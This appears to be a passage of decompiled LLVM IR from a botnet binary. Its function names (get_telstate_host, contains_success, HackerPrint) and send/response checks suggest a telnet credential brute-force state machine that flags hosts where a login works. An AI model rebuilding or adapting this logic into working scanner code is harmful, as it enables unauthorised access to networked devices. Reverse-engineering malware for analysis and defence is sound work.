  %v1_804d214 = add i32 %v2_804d212, 6
  store i32 %v1_804d214, i32* @ebx, align 4
  %v1_804d21a = add i32 %v0_804d183, 16
  %v2_804d21a = inttoptr i32 %v1_804d21a to i32*
  store i32 0, i32* %v2_804d21a, align 4
  %v0_804d21c = load i32, i32* %stack_var_-336, align 4
  %v1_804d21c = inttoptr i32 %v0_804d21c to i32*
  %v2_804d21c = call i32 @__GI_time(i32* %v1_804d21c)
  store i32 %v2_804d21c, i32* %eax.global-to-local, align 4
  %v0_804d224 = load i32, i32* @ebx, align 4
  %v7_804d224 = icmp ult i32 %v0_804d224, %v2_804d21c
  %v1_804d226 = icmp eq i1 %v7_804d224, false
  br i1 %v1_804d226, label %dec_label_pc_804dadc, label %dec_label_pc_804d22c

dec_label_pc_804d22c:                             ; preds = %dec_label_pc_804d1f7
  store i8 0, i8* %v4_804ca1b, align 4
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  %v3_804d25d = add i32 %v2_804c976, %v2_804c9ca
  %v4_804d25d = inttoptr i32 %v3_804d25d to i8*
  store i8 1, i8* %v4_804d25d, align 1
  br label %dec_label_pc_804dadc

dec_label_pc_804d267:                             ; preds = %dec_label_pc_804ca05
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  %v3_804d27d = add i32 %v2_804cb87, %v2_804c9ca
  %v4_804d27d = inttoptr i32 %v3_804d27d to i8*
  %v5_804d27d = load i8, i8* %v4_804d27d, align 2
  %v6_804d27d = zext i8 %v5_804d27d to i32
  store i32 %v6_804d27d, i32* %eax.global-to-local, align 4
  %v1_804d286 = mul nuw nsw i32 %v6_804d27d, 4
  %v2_804d286 = add nuw nsw i32 %v1_804d286, 134607936
  %v3_804d286 = inttoptr i32 %v2_804d286 to i32*
  %v4_804d286 = load i32, i32* %v3_804d286, align 4
  %v1_804d298 = and i32 %v4_804d286, -256
  store i32 %v1_804d298, i32* %eax.global-to-local, align 4
  %v4_804d29b = inttoptr i32 %v4_804d286 to i8*
  store i32 %v4_804d286, i32* @edi, align 4
  %v3_804d2a1 = call i32 @_strlen(i8* %v4_804d29b)
  store i32 %v3_804d2a1, i32* @esi, align 4
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  %v5_804d2c0 = load i8, i8* %v4_804d27d, align 2
  %v6_804d2c0 = zext i8 %v5_804d2c0 to i32
  store i32 %v6_804d2c0, i32* %eax.global-to-local, align 4
  %v1_804d2c9 = mul nuw nsw i32 %v6_804d2c0, 4
  %v2_804d2c9 = add nuw nsw i32 %v1_804d2c9, 134607936
  %v3_804d2c9 = inttoptr i32 %v2_804d2c9 to i32*
  %v4_804d2c9 = load i32, i32* %v3_804d2c9, align 4
  store i32 %v4_804d2c9, i32* @ebx, align 4
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  %v3_804d2e6 = inttoptr i32 %v2_804c9cc to i32*
  %v4_804d2e6 = load i32, i32* %v3_804d2e6, align 4
  store i32 %v4_804d2e6, i32* %eax.global-to-local, align 4
  %v0_804d2e9 = load i32, i32* @esp, align 4
  %v1_804d2e9 = add i32 %v0_804d2e9, -4
  %v2_804d2e9 = inttoptr i32 %v1_804d2e9 to i32*
  store i32 16384, i32* %v2_804d2e9, align 4
  %v0_804d2ee = load i32, i32* @esi, align 4
  %v2_804d2ee = add i32 %v0_804d2e9, -8
  %v3_804d2ee = inttoptr i32 %v2_804d2ee to i32*
  store i32 %v0_804d2ee, i32* %v3_804d2ee, align 4
  %v0_804d2ef = load i32, i32* @ebx, align 4
  %v2_804d2ef = add i32 %v0_804d2e9, -12
  %v3_804d2ef = inttoptr i32 %v2_804d2ef to i32*
  store i32 %v0_804d2ef, i32* %v3_804d2ef, align 4
  %v0_804d2f0 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d2f0 = add i32 %v0_804d2e9, -16
  %v3_804d2f0 = inttoptr i32 %v2_804d2f0 to i32*
  store i32 %v0_804d2f0, i32* %v3_804d2f0, align 4
  %v3_804d2f1 = load i32, i32* %stack_var_-608, align 4
  %v4_804d2f1 = call i32 @__libc_send(i32 %v4_804d286, i32 %v2_804c8ed, i32 %v6_804ca1b, i32 %v3_804d2f1)
  %v0_804d2f6 = load i32, i32* @esp, align 4
  %v2_804d2f9 = icmp slt i32 %v4_804d2f1, 0
  %v1_804d2fb = icmp eq i1 %v2_804d2f9, false
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  br i1 %v1_804d2fb, label %dec_label_pc_804d338, label %dec_label_pc_804d2fd

dec_label_pc_804d2fd:                             ; preds = %dec_label_pc_804d267
  store i8 0, i8* %v4_804ca1b, align 4
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  %v3_804d32e = add i32 %v2_804c976, %v2_804c9ca
  %v4_804d32e = inttoptr i32 %v3_804d32e to i8*
  store i8 1, i8* %v4_804d32e, align 1
  br label %dec_label_pc_804dadc

dec_label_pc_804d338:                             ; preds = %dec_label_pc_804d267
  %v4_804d34e = load i32, i32* %v3_804d2e6, align 4
  store i32 %v4_804d34e, i32* %eax.global-to-local, align 4
  %v1_804d351 = add i32 %v0_804d2f6, 12
  %v2_804d351 = inttoptr i32 %v1_804d351 to i32*
  store i32 16384, i32* %v2_804d351, align 4
  %v1_804d356 = add i32 %v0_804d2f6, 8
  %v2_804d356 = inttoptr i32 %v1_804d356 to i32*
  store i32 2, i32* %v2_804d356, align 4
  %v1_804d358 = add i32 %v0_804d2f6, 4
  %v2_804d358 = inttoptr i32 %v1_804d358 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80591c9.250 to i32), i32* %v2_804d358, align 4
  %v0_804d35d = load i32, i32* %eax.global-to-local, align 4
  %v3_804d35d = inttoptr i32 %v0_804d2f6 to i32*
  store i32 %v0_804d35d, i32* %v3_804d35d, align 4
  %v3_804d35e = load i32, i32* %stack_var_-608, align 4
  %v4_804d35e = call i32 @__libc_send(i32 %v4_804d286, i32 %v2_804c8ed, i32 %v6_804ca1b, i32 %v3_804d35e)
  %v2_804d366 = icmp slt i32 %v4_804d35e, 0
  %v1_804d368 = icmp eq i1 %v2_804d366, false
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  br i1 %v1_804d368, label %dec_label_pc_804d3a5, label %dec_label_pc_804d36a

dec_label_pc_804d36a:                             ; preds = %dec_label_pc_804d338
  store i8 0, i8* %v4_804ca1b, align 4
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  %v3_804d39b = add i32 %v2_804c976, %v2_804c9ca
  %v4_804d39b = inttoptr i32 %v3_804d39b to i8*
  store i8 1, i8* %v4_804d39b, align 1
  br label %dec_label_pc_804dadc

dec_label_pc_804d3a5:                             ; preds = %dec_label_pc_804d338
  store i8 4, i8* %v4_804ca1b, align 4
  br label %dec_label_pc_804dadc

dec_label_pc_804d3c5:                             ; preds = %dec_label_pc_804ca05
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  %v1_804d3dd = add i32 %v2_804c9cc, 24
  store i32 %v1_804d3dd, i32* %eax.global-to-local, align 4
  %v1_804d3e0 = inttoptr i32 %v1_804d3dd to i32*
  %v2_804d3e0 = load i32, i32* %v1_804d3e0, align 4
  store i32 %v2_804d3e0, i32* @ebx, align 4
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  %v3_804d3f8 = inttoptr i32 %v2_804c9cc to i32*
  %v4_804d3f8 = load i32, i32* %v3_804d3f8, align 4
  store i32 %v4_804d3f8, i32* %eax.global-to-local, align 4
  %v0_804d3fb = load i32, i32* @esp, align 4
  %v1_804d3fe = add i32 %v0_804d3fb, -16
  %v2_804d3fe = inttoptr i32 %v1_804d3fe to i32*
  store i32 ptrtoint (i32* @global_var_805f4fc to i32), i32* %v2_804d3fe, align 4
  %v1_804d403 = add i32 %v0_804d3fb, -20
  %v2_804d403 = inttoptr i32 %v1_804d403 to i32*
  store i32 1024, i32* %v2_804d403, align 4
  %v0_804d408 = load i32, i32* @ebx, align 4
  %v2_804d408 = add i32 %v0_804d3fb, -24
  %v3_804d408 = inttoptr i32 %v2_804d408 to i32*
  store i32 %v0_804d408, i32* %v3_804d408, align 4
  %v5_804d409 = add i32 %v0_804d3fb, -28
  %v6_804d409 = inttoptr i32 %v5_804d409 to i32*
  store i32 10, i32* %v6_804d409, align 4
  %v0_804d40c = load i32, i32* %eax.global-to-local, align 4
  %v2_804d40c = add i32 %v0_804d3fb, -32
  %v3_804d40c = inttoptr i32 %v2_804d40c to i32*
  store i32 %v0_804d40c, i32* %v3_804d40c, align 4
  %v1_804d40d = call i32 @read_until_response(i32 %v6_804ca1b)
  %v0_804d412 = load i32, i32* @esp, align 4
  %v1_804d415 = icmp eq i32 %v1_804d40d, 0
  store i32 %v1_804c9bc, i32* @edx, align 4
  store i32 %v2_804c9cc, i32* %eax.global-to-local, align 4
  br i1 %v1_804d415, label %dec_label_pc_804d486, label %dec_label_pc_804d419

dec_label_pc_804d419:                             ; preds = %dec_label_pc_804d3c5
  store i32 %v1_804d3dd, i32* %eax.global-to-local, align 4
  %v2_804d434 = load i32, i32* %v1_804d3e0, align 4
  store i32 %v2_804d434, i32* %eax.global-to-local, align 4
  %v2_804d439 = add i32 %v0_804d412, 16
  %v3_804d439 = inttoptr i32 %v2_804d439 to i32*
  store i32 %v2_804d434, i32* %v3_804d439, align 4
  %v0_804d43a = call i32 @contains_fail()
  %v1_804d442 = icmp eq i32 %v0_804d43a, 0
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  br i1 %v1_804d442, label %dec_label_pc_804d466, label %dec_label_pc_804d446

dec_label_pc_804d446:                             ; preds = %dec_label_pc_804d419
  store i8 0, i8* %v4_804ca1b, align 4
  br label %dec_label_pc_804dadc

dec_label_pc_804d466:                             ; preds = %dec_label_pc_804d419
  store i8 5, i8* %v4_804ca1b, align 4
  br label %dec_label_pc_804dadc

dec_label_pc_804d486:                             ; preds = %dec_label_pc_804d3c5
  store i32 %v1_804c9ce, i32* %eax.global-to-local, align 4
  %v2_804d4a1 = load i32, i32* %v1_804c9d1, align 4
  store i32 %v2_804d4a1, i32* %eax.global-to-local, align 4
  %v1_804d4a3 = add i32 %v2_804d4a1, 6
  store i32 %v1_804d4a3, i32* @ebx, align 4
  %v1_804d4a9 = add i32 %v0_804d412, 16
  %v2_804d4a9 = inttoptr i32 %v1_804d4a9 to i32*
  store i32 0, i32* %v2_804d4a9, align 4
  %v1_804d4ab = inttoptr i32 %stack_var_-620.242 to i32*
  %v2_804d4ab = call i32 @__GI_time(i32* %v1_804d4ab)
  store i32 %v2_804d4ab, i32* %eax.global-to-local, align 4
  %v0_804d4b3 = load i32, i32* @ebx, align 4
  %v7_804d4b3 = icmp ult i32 %v0_804d4b3, %v2_804d4ab
  %v1_804d4b5 = icmp eq i1 %v7_804d4b3, false
  br i1 %v1_804d4b5, label %dec_label_pc_804dadc, label %dec_label_pc_804d4bb

dec_label_pc_804d4bb:                             ; preds = %dec_label_pc_804d486
  store i8 0, i8* %v4_804ca1b, align 4
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  %v3_804d4ec = add i32 %v2_804c976, %v2_804c9ca
  %v4_804d4ec = inttoptr i32 %v3_804d4ec to i8*
  store i8 1, i8* %v4_804d4ec, align 1
  br label %dec_label_pc_804dadc

dec_label_pc_804d4f6:                             ; preds = %dec_label_pc_804ca05
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  %v3_804d50c = add i32 %v2_804cb4d, %v2_804c9ca
  %v4_804d50c = inttoptr i32 %v3_804d50c to i8*
  %v5_804d50c = load i8, i8* %v4_804d50c, align 1
  %v6_804d50c = zext i8 %v5_804d50c to i32
  store i32 %v6_804d50c, i32* %eax.global-to-local, align 4
  %v1_804d515 = mul nuw nsw i32 %v6_804d50c, 4
  %v2_804d515 = add nuw nsw i32 %v1_804d515, 134608032
  %v3_804d515 = inttoptr i32 %v2_804d515 to i32*
  %v4_804d515 = load i32, i32* %v3_804d515, align 4
  %v1_804d527 = and i32 %v4_804d515, -256
  store i32 %v1_804d527, i32* %eax.global-to-local, align 4
  %v4_804d52a = inttoptr i32 %v4_804d515 to i8*
  store i32 %v4_804d515, i32* @edi, align 4
  %v3_804d530 = call i32 @_strlen(i8* %v4_804d52a)
  store i32 %v3_804d530, i32* @esi, align 4
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  %v5_804d54f = load i8, i8* %v4_804d50c, align 1
  %v6_804d54f = zext i8 %v5_804d54f to i32
  store i32 %v6_804d54f, i32* %eax.global-to-local, align 4
  %v1_804d558 = mul nuw nsw i32 %v6_804d54f, 4
  %v2_804d558 = add nuw nsw i32 %v1_804d558, 134608032
  %v3_804d558 = inttoptr i32 %v2_804d558 to i32*
  %v4_804d558 = load i32, i32* %v3_804d558, align 4
  store i32 %v4_804d558, i32* @ebx, align 4
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  %v3_804d575 = inttoptr i32 %v2_804c9cc to i32*
  %v4_804d575 = load i32, i32* %v3_804d575, align 4
  store i32 %v4_804d575, i32* %eax.global-to-local, align 4
  %v0_804d578 = load i32, i32* @esp, align 4
  %v1_804d578 = add i32 %v0_804d578, -4
  %v2_804d578 = inttoptr i32 %v1_804d578 to i32*
  store i32 16384, i32* %v2_804d578, align 4
  %v0_804d57d = load i32, i32* @esi, align 4
  %v2_804d57d = add i32 %v0_804d578, -8
  %v3_804d57d = inttoptr i32 %v2_804d57d to i32*
  store i32 %v0_804d57d, i32* %v3_804d57d, align 4
  %v0_804d57e = load i32, i32* @ebx, align 4
  %v2_804d57e = add i32 %v0_804d578, -12
  %v3_804d57e = inttoptr i32 %v2_804d57e to i32*
  store i32 %v0_804d57e, i32* %v3_804d57e, align 4
  %v0_804d57f = load i32, i32* %eax.global-to-local, align 4
  %v2_804d57f = add i32 %v0_804d578, -16
  %v3_804d57f = inttoptr i32 %v2_804d57f to i32*
  store i32 %v0_804d57f, i32* %v3_804d57f, align 4
  %v4_804d580 = call i32 @__libc_send(i32 %v4_804d515, i32 %stack_var_-620.242, i32 %v2_804c8ed, i32 %v6_804ca1b)
  %v0_804d585 = load i32, i32* @esp, align 4
  %v2_804d588 = icmp slt i32 %v4_804d580, 0
  %v1_804d58a = icmp eq i1 %v2_804d588, false
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  br i1 %v1_804d58a, label %dec_label_pc_804d5c7, label %dec_label_pc_804d58c

dec_label_pc_804d58c:                             ; preds = %dec_label_pc_804d4f6
  store i8 0, i8* %v4_804ca1b, align 4
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  %v3_804d5bd = add i32 %v2_804c976, %v2_804c9ca
  %v4_804d5bd = inttoptr i32 %v3_804d5bd to i8*
  store i8 1, i8* %v4_804d5bd, align 1
  br label %dec_label_pc_804dadc

dec_label_pc_804d5c7:                             ; preds = %dec_label_pc_804d4f6
  %v4_804d5dd = load i32, i32* %v3_804d575, align 4
  store i32 %v4_804d5dd, i32* %eax.global-to-local, align 4
  %v1_804d5e0 = add i32 %v0_804d585, 12
  %v2_804d5e0 = inttoptr i32 %v1_804d5e0 to i32*
  store i32 16384, i32* %v2_804d5e0, align 4
  %v1_804d5e5 = add i32 %v0_804d585, 8
  %v2_804d5e5 = inttoptr i32 %v1_804d5e5 to i32*
  store i32 2, i32* %v2_804d5e5, align 4
  %v1_804d5e7 = add i32 %v0_804d585, 4
  %v2_804d5e7 = inttoptr i32 %v1_804d5e7 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80591c9.250 to i32), i32* %v2_804d5e7, align 4
  %v0_804d5ec = load i32, i32* %eax.global-to-local, align 4
  %v3_804d5ec = inttoptr i32 %v0_804d585 to i32*
  store i32 %v0_804d5ec, i32* %v3_804d5ec, align 4
  %v4_804d5ed = call i32 @__libc_send(i32 %v4_804d515, i32 %stack_var_-620.242, i32 %v2_804c8ed, i32 %v6_804ca1b)
  %v2_804d5f5 = icmp slt i32 %v4_804d5ed, 0
  %v1_804d5f7 = icmp eq i1 %v2_804d5f5, false
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  br i1 %v1_804d5f7, label %dec_label_pc_804d634, label %dec_label_pc_804d5f9

dec_label_pc_804d5f9:                             ; preds = %dec_label_pc_804d5c7
  store i8 0, i8* %v4_804ca1b, align 4
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  %v3_804d62a = add i32 %v2_804c976, %v2_804c9ca
  %v4_804d62a = inttoptr i32 %v3_804d62a to i8*
  store i8 1, i8* %v4_804d62a, align 1
  br label %dec_label_pc_804dadc

dec_label_pc_804d634:                             ; preds = %dec_label_pc_804d5c7
  store i8 6, i8* %v4_804ca1b, align 4
  br label %dec_label_pc_804dadc

dec_label_pc_804d654:                             ; preds = %dec_label_pc_804ca05
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  %v1_804d66c = add i32 %v2_804c9cc, 24
  store i32 %v1_804d66c, i32* %eax.global-to-local, align 4
  %v1_804d66f = inttoptr i32 %v1_804d66c to i32*
  %v2_804d66f = load i32, i32* %v1_804d66f, align 4
  store i32 %v2_804d66f, i32* @ebx, align 4
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  %v3_804d687 = inttoptr i32 %v2_804c9cc to i32*
  %v4_804d687 = load i32, i32* %v3_804d687, align 4
  store i32 %v4_804d687, i32* %eax.global-to-local, align 4
  %v0_804d68a = load i32, i32* @esp, align 4
  %v1_804d68d = add i32 %v0_804d68a, -16
  %v2_804d68d = inttoptr i32 %v1_804d68d to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_805f560.251 to i32), i32* %v2_804d68d, align 4
  %v1_804d692 = add i32 %v0_804d68a, -20
  %v2_804d692 = inttoptr i32 %v1_804d692 to i32*
  store i32 1024, i32* %v2_804d692, align 4
  %v0_804d697 = load i32, i32* @ebx, align 4
  %v2_804d697 = add i32 %v0_804d68a, -24
  %v3_804d697 = inttoptr i32 %v2_804d697 to i32*
  store i32 %v0_804d697, i32* %v3_804d697, align 4
  %v5_804d698 = add i32 %v0_804d68a, -28
  %v6_804d698 = inttoptr i32 %v5_804d698 to i32*
  store i32 10, i32* %v6_804d698, align 4
  %v0_804d69b = load i32, i32* %eax.global-to-local, align 4
  %v2_804d69b = add i32 %v0_804d68a, -32
  %v3_804d69b = inttoptr i32 %v2_804d69b to i32*
  store i32 %v0_804d69b, i32* %v3_804d69b, align 4
  %v1_804d69c = call i32 @read_until_response(i32 %v6_804ca1b)
  store i32 %v1_804d69c, i32* %eax.global-to-local, align 4
  %v0_804d6a1 = load i32, i32* @esp, align 4
  %v1_804d6a4 = icmp eq i32 %v1_804d69c, 0
  br i1 %v1_804d6a4, label %dec_label_pc_804d907, label %dec_label_pc_804d6ac

dec_label_pc_804d6ac:                             ; preds = %dec_label_pc_804d654
  store i32 %storemerge43, i32* @ebx, align 4
  %v1_804d6b2 = add i32 %v0_804d6a1, 16
  %v2_804d6b2 = inttoptr i32 %v1_804d6b2 to i32*
  store i32 0, i32* %v2_804d6b2, align 4
  %v1_804d6b4 = inttoptr i32 %stack_var_-624.241 to i32*
  %v2_804d6b4 = call i32 @__GI_time(i32* %v1_804d6b4)
  store i32 %v2_804d6b4, i32* @esi, align 4
  %v0_804d6c1 = load i32, i32* @ebx, align 4
  %v2_804d6d1 = mul i32 %v0_804d6c1, 28
  %v1_804d6d5 = add i32 %v2_804d6d3, %v2_804d6d1
  %v2_804d6d8 = inttoptr i32 %v1_804d6d5 to i32*
  store i32 %v2_804d6b4, i32* %v2_804d6d8, align 4
  store i32 %v1_804c9bc, i32* @edx, align 4
  store i32 %v1_804d66c, i32* %eax.global-to-local, align 4
  %v2_804d6f5 = load i32, i32* %v1_804d66f, align 4
  store i32 %v2_804d6f5, i32* %eax.global-to-local, align 4
  %v0_804d6f7 = load i32, i32* @esp, align 4
  %v2_804d6fa = add i32 %v0_804d6f7, -16
  %v3_804d6fa = inttoptr i32 %v2_804d6fa to i32*
  store i32 %v2_804d6f5, i32* %v3_804d6fa, align 4
  %v0_804d6fb = call i32 @contains_fail()
  %v0_804d700 = load i32, i32* @esp, align 4
  %v1_804d703 = icmp eq i32 %v0_804d6fb, 0
  store i32 %v1_804c9bc, i32* @edx, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  br i1 %v1_804d703, label %dec_label_pc_804d727, label %dec_label_pc_804d707

dec_label_pc_804d707:                             ; preds = %dec_label_pc_804d6ac
  store i8 0, i8* %v4_804ca1b, align 4
  br label %dec_label_pc_804dadc

dec_label_pc_804d727:                             ; preds = %dec_label_pc_804d6ac
  store i32 %v1_804d66c, i32* %eax.global-to-local, align 4
  %v2_804d742 = load i32, i32* %v1_804d66f, align 4
  store i32 %v2_804d742, i32* %eax.global-to-local, align 4
  %v3_804d747 = inttoptr i32 %v0_804d700 to i32*
  store i32 %v2_804d742, i32* %v3_804d747, align 4
  %v0_804d748 = call i32 @contains_success()
  %v0_804d74d = load i32, i32* @esp, align 4
  %v1_804d750 = icmp eq i32 %v0_804d748, 0
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  br i1 %v1_804d750, label %dec_label_pc_804d8cc, label %dec_label_pc_804d758

dec_label_pc_804d758:                             ; preds = %dec_label_pc_804d727
  %v3_804d76e = add i32 %v2_804c976, %v2_804c9ca
  %v4_804d76e = inttoptr i32 %v3_804d76e to i8*
  %v5_804d76e = load i8, i8* %v4_804d76e, align 1
  %v10_804d772 = icmp eq i8 %v5_804d76e, 2
  %v1_804d774 = icmp eq i1 %v10_804d772, false
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  br i1 %v1_804d774, label %dec_label_pc_804d796, label %dec_label_pc_804d776

dec_label_pc_804d776:                             ; preds = %dec_label_pc_804d758
  store i8 7, i8* %v4_804ca1b, align 4
  br label %dec_label_pc_804dadc

dec_label_pc_804d796:                             ; preds = %dec_label_pc_804d758
  %v3_804d7ac = add i32 %v2_804cb4d, %v2_804c9ca
  %v4_804d7ac = inttoptr i32 %v3_804d7ac to i8*
  %v5_804d7ac = load i8, i8* %v4_804d7ac, align 1
  %v6_804d7ac = zext i8 %v5_804d7ac to i32
  store i32 %v6_804d7ac, i32* %eax.global-to-local, align 4
  %v1_804d7b5 = mul nuw nsw i32 %v6_804d7ac, 4
  %v2_804d7b5 = add nuw nsw i32 %v1_804d7b5, 134608032
  %v3_804d7b5 = inttoptr i32 %v2_804d7b5 to i32*
  %v4_804d7b5 = load i32, i32* %v3_804d7b5, align 4
  store i32 %v4_804d7b5, i32* @ebx, align 4
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  %v3_804d7d2 = add i32 %v2_804cb87, %v2_804c9ca
  %v4_804d7d2 = inttoptr i32 %v3_804d7d2 to i8*
  %v5_804d7d2 = load i8, i8* %v4_804d7d2, align 2
  %v6_804d7d2 = zext i8 %v5_804d7d2 to i32
  store i32 %v6_804d7d2, i32* %eax.global-to-local, align 4
  %v1_804d7db = mul nuw nsw i32 %v6_804d7d2, 4
  %v2_804d7db = add nuw nsw i32 %v1_804d7db, 134607936
  %v3_804d7db = inttoptr i32 %v2_804d7db to i32*
  %v4_804d7db = load i32, i32* %v3_804d7db, align 4
  store i32 %v4_804d7db, i32* @esi, align 4
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9cc, i32* %eax.global-to-local, align 4
  %v3_804d7fe = inttoptr i32 %v0_804d74d to i32*
  store i32 %v2_804c9cc, i32* %v3_804d7fe, align 4
  %v0_804d7ff = call i32 @get_telstate_host()
  store i32 %v0_804d7ff, i32* %eax.global-to-local, align 4
  %v0_804d804 = load i32, i32* @esp, align 4
  %v0_804d807 = load i32, i32* @global_var_805f8c0.20, align 64
  store i32 %v0_804d807, i32* %edx.global-to-local, align 4
  %v0_804d810 = load i32, i32* @ebx, align 4
  %v3_804d810 = inttoptr i32 %v0_804d804 to i32*
  store i32 %v0_804d810, i32* %v3_804d810, align 4
  %v0_804d811 = load i32, i32* @esi, align 4
  %v2_804d811 = add i32 %v0_804d804, -4
  %v3_804d811 = inttoptr i32 %v2_804d811 to i32*
  store i32 %v0_804d811, i32* %v3_804d811, align 4
  %v2_804d812 = add i32 %v0_804d804, -8
  %v3_804d812 = inttoptr i32 %v2_804d812 to i32*
  store i32 %v0_804d7ff, i32* %v3_804d812, align 4
  %v1_804d813 = add i32 %v0_804d804, -12
  %v2_804d813 = inttoptr i32 %v1_804d813 to i32*
  store i32 ptrtoint (i32* @global_var_80591cc.252 to i32), i32* %v2_804d813, align 4
  %v0_804d818 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d818 = add i32 %v0_804d804, -16
  %v3_804d818 = inttoptr i32 %v2_804d818 to i32*
  store i32 %v0_804d818, i32* %v3_804d818, align 4
  %v2_804d819 = call i32 @HackerPrint(i32 %stack_var_-624.241, i32 %stack_var_-620.242)
  %v0_804d81e = load i32, i32* @esp, align 4
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  %v5_804d837 = load i8, i8* %v4_804d7ac, align 1
  %v6_804d837 = zext i8 %v5_804d837 to i32
  store i32 %v6_804d837, i32* %eax.global-to-local, align 4
  %v1_804d840 = mul nuw nsw i32 %v6_804d837, 4
  %v2_804d840 = add nuw nsw i32 %v1_804d840, 134608032
  %v3_804d840 = inttoptr i32 %v2_804d840 to i32*
  %v4_804d840 = load i32, i32* %v3_804d840, align 4
  store i32 %v4_804d840, i32* @ebx, align 4
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  %v5_804d85d = load i8, i8* %v4_804d7d2, align 2
  %v6_804d85d = zext i8 %v5_804d85d to i32
  store i32 %v6_804d85d, i32* %eax.global-to-local, align 4
  %v1_804d866 = mul nuw nsw i32 %v6_804d85d, 4
  %v2_804d866 = add nuw nsw i32 %v1_804d866, 134607936
  %v3_804d866 = inttoptr i32 %v2_804d866 to i32*
  %v4_804d866 = load i32, i32* %v3_804d866, align 4
  store i32 %v4_804d866, i32* @esi, align 4
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9cc, i32* %eax.global-to-local, align 4
  %v2_804d889 = add i32 %v0_804d81e, 16
  %v3_804d889 = inttoptr i32 %v2_804d889 to i32*
  store i32 %v2_804c9cc, i32* %v3_804d889, align 4
  %v0_804d88a = call i32 @get_telstate_host()
  store i32 %v0_804d88a, i32* %eax.global-to-local, align 4
  %v0_804d88f = load i32, i32* @esp, align 4
  %v0_804d892 = load i32, i32* @global_var_805f8c0.20, align 64
  store i32 %v0_804d892, i32* %edx.global-to-local, align 4
  %v0_804d89b = load i32, i32* @ebx, align 4
  %v3_804d89b = inttoptr i32 %v0_804d88f to i32*
  store i32 %v0_804d89b, i32* %v3_804d89b, align 4
  %v0_804d89c = load i32, i32* @esi, align 4
  %v2_804d89c = add i32 %v0_804d88f, -4
  %v3_804d89c = inttoptr i32 %v2_804d89c to i32*
  store i32 %v0_804d89c, i32* %v3_804d89c, align 4
  %v2_804d89d = add i32 %v0_804d88f, -8
  %v3_804d89d = inttoptr i32 %v2_804d89d to i32*
  store i32 %v0_804d88a, i32* %v3_804d89d, align 4
  %v1_804d89e = add i32 %v0_804d88f, -12
  %v2_804d89e = inttoptr i32 %v1_804d89e to i32*
  store i32 ptrtoint ([16 x i8]* @global_var_8059238.253 to i32), i32* %v2_804d89e, align 4
  %v0_804d8a3 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d8a3 = add i32 %v0_804d88f, -16
  %v3_804d8a3 = inttoptr i32 %v2_804d8a3 to i32*
  store i32 %v0_804d8a3, i32* %v3_804d8a3, align 4
  %v2_804d8a4 = call i32 @HackerPrint(i32 %stack_var_-624.241, i32 %stack_var_-620.242)
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9ca, i32* %eax.global-to-local, align 4
  store i8 7, i8* %v4_804ca1b, align 4
  br label %dec_label_pc_804dadc

dec_label_pc_804d8cc:                             ; preds = %dec_label_pc_804d727
  store i8 0, i8* %v4_804ca1b, align 4
  store i32 %v1_804c9bc, i32* %edx.global-to-local, align 4
